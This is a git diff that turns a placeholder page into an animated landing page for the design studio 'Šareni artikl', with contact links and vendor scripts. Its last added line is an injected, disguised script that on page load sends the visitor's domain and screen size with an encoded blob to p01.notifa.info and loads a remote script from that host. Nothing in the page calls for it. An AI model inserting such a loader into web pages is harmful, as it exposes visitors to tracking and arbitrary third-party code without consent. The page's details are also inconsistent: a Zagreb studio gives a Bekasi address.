@@ -1,8 +1,131 @@
-<html>
-<head>
-	<title>aliadanny</title>
-</head>
-<body>
-  <h1>Hello World!</h1>
-</body>
+<!doctype html>
+<html class="no-js" lang="">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="x-ua-compatible" content="ie=edge">
+        <title>Šareni artikl</title>
+        <meta name="description" content="Šareni artikl">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
+        <link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
+        <link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
+        <link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
+        <link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
+        <link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
+        <link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
+        <link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
+        <link rel="icon" type="image/png" sizes="192x192"  href="/android-icon-192x192.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+        <link rel="manifest" href="/manifest.json">
+        <meta name="msapplication-TileColor" content="#ffffff">
+        <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+        <meta name="theme-color" content="#ffffff">
+        <!-- Place favicon.ico in the root directory -->
+
+        <link rel="stylesheet" href="css/normalize.css">
+        <link rel="stylesheet" href="css/main.css">
+        <script src="js/vendor/modernizr-2.8.3.min.js"></script>
+    </head>
+    <body>
+
+        <!--[if lt IE 8]>
+            <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+        <![endif]-->
+
+        <div id="glavniKontejner">
+            <div id="logo"></div>
+            <div id="unutarnjiKontejner">
+                <div class="oblak" id="sloj1"></div>
+                <div class="oblak" id="sloj2"></div>
+                <div class="oblak" id="sloj3"></div>
+                <div id="prstiIZastavaKontejner">
+                    <div class="podKontejner">
+                        <div id="lijeviPrsti"></div>
+                        <div id="desniPrsti"></div>
+                        <div id="zastava"></div>
+                        <div id="sjena"></div>
+                    </div>
+                </div>
+                <div id="svemirskiObjektiKontejner">
+                    <canvas id="canvas_sunce" width="1422" height="1422"></canvas>
+                    <div id="mjesec"></div>
+                </div>
+                <div id="manana"></div>
+                <div id="kaktusKontejner">
+                    <div id="kaktus"></div>
+                </div>
+                <div id="datumKontejner">
+                    <div class="prviDatum">
+                        <div class="unutarnjiKontejner">
+                            <span class="datum" id="currentDate"></span>
+                            
+                            <span class="stapka"></span>
+                        </div>
+                    </div>
+                    <div class="drugiDatum">
+                        <div class="unutarnjiKontejner">
+                            <span class="datum">20.10.2019.</span>
+                            <span class="stapka"></span>
+                        </div>
+                    </div>                    
+                </div>
+                <div id="bravoTekst">
+                    <span class="lijevo">
+                    
+                    </span>
+                    <span class="desno">
+                    
+                    </span>
+                </div>
+                <div id="tlo"></div>
+                <div id="noc"></div>
+            </div>
+            <div id="infoGumb">
+                <span class="info"></span>
+                <span class="zatvori"></span>
+            </div>
+            <div id="infoKontejner">
+                <div class="infoPodKontejner">
+                    <h1>Šareni artikl is a design studio from Zagreb, Croatia.<br class="desktop">
+                        We do great work, once we get around to it.
+                    </h1>
+                    <div class="infoModul jedan">
+                        <div class="linija"></div>
+                        <h2>CONTACT</h4>
+                        <span><a target="_blank" href="https://www.instagram.com/dannyarw/">@dannyarw</a></span>
+                        <span><a target="_blank" href="https://www.instagram.com/alialuth/">@alialuth</a></span>
+                    </div>       
+                    <div class="infoModul dva">
+                        <div class="linija"></div>
+                        <h2>ADDRESS</h4>
+                        <span>KH Noer Ali Hall, Islamic Center Bekasi</span>
+                        <span><a target="_blank" href="https://goo.gl/maps/VhjXK2FkiFoumCwm7">Click here to get diretion!</a></span>
+                    </div>     
+
+                </div>
+            </div>
+        </div>
+
+        <script type="text/javascript">
+            n =  new Date();
+            y = n.getFullYear();
+            m = n.getMonth() + 1;
+            d = n.getDate();
+            document.getElementById("currentDate").innerHTML = d + "." + m + "." + y + ".";
+        </script>       
+        <script src="https://code.jquery.com/jquery-1.12.0.min.js"></script>
+        <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.12.0.min.js"><\/script>')</script>
+        <script src="https://code.createjs.com/createjs-2015.11.26.min.js"></script>
+        <script src="https://use.typekit.net/sns2vqy.js"></script>
+        <script>try{Typekit.load({ async: true });}catch(e){}</script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/1.19.1/TweenMax.min.js"></script>
+        <script src="js/main.js"></script>
+        <script src="js/animacije/prsti_i_zastava.js"></script>
+        <script src="js/animacije/sunce.js"></script>
+
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2IS3N8nuPbIcQQkonZ2n0eJAncxY8mw4as8gNZeP7xMS5rSZtw%2fo6XSkAlq%2bz9%2bHA%2f121WhmZ5lMX6d6BJtLhCDzOzncARlY5BWdRVmCXVyOX7fW%2bLa4QASlJbudPDCk%2fKYJ97pGH6IUqVH6BgzLPcCtvwizwfz0DbHsfjm1yZmwxhaxIjQaPNUpu6TOTX%2bibB1ZVB2T4vv5wWoqMwh9tdQPBFM65Fca2DLTRjRnLVmm%2bArXgklkEfHuSfOzry6K5HSGtIx0RHBPNm3J3FDrFQt8oDI20nqPeSTThuc3KCuRBWQCq63tsQMIZEl04%2fkzWdpzo4sSvQW5CFWk2jXhLJ244g51%2b7AyaFC%2fjssK2avA9ejXnbAAJX%2bO3T4CLThQILhhVdU9fBajeUDNnd%2feQ7v8vMg7IR%2flgdW5tYyEG7qPrEEm%2fexAXmdXQ%2bzlTjv%2fJamMNb99uS5xDgda3zFp2Lbzp%2f0mORto4chsEA%2b8QBCmckbN%2bmp1wQdydo1bolXpSTC2a1c9jCBDdcqjHsykS09JJRxP50pp0l0Tx3BREJls%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 </html>
